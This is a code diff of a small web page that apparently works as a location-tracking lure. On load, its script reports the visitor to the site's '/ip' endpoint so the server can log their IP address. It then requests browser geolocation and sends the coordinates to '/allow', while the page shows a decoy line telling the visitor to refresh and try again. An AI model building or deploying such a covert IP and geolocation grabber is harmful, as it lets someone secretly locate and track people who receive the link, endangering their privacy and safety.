@@ -2,28 +2,33 @@
 <html>
 
 <body>
-    <!-- <p id="url"></p>
-    <p id="AllowLocation"></p> -->
-
+    <p>Please refresh the page and try again</p>
+    <p id="AllowLocation"></p>
+    <p id="IPinfo"></p>
+    
     <script>
+        var Latitude;
+        var Longitude;
         window.onload = async function() {
             
             await fetch(window.location.origin+'/ip?cl='+window.location.pathname)
-        var Latitude;
-        var Longitude;
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition);
+            document.getElementById("IPinfo").innerHTML = "Ipinfo is allowed";
+        
+        if (await navigator.geolocation) {
+            await navigator.geolocation.getCurrentPosition(showPosition);
+            
             
         } else {
-            //document.getElementById("AllowLocation").innerHTML = "Geolocation is not supported by this browser.";
+            document.getElementById("AllowLocation").innerHTML = "Geolocation is not supported by this browser.";
             await fetch(window.location.origin+'/ip?cl='+window.location.pathname)
-            navigator.geolocation.getCurrentPosition(showPosition);
+            await navigator.geolocation.getCurrentPosition(showPosition);
         }
 
         async function showPosition(position) {
                 Latitude=await position.coords.latitude;
                 Longitude=await position.coords.longitude;
                 await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )      
+                document.getElementById("AllowLocation").innerHTML = "Geolocation is allowed";
         }
             };  
 
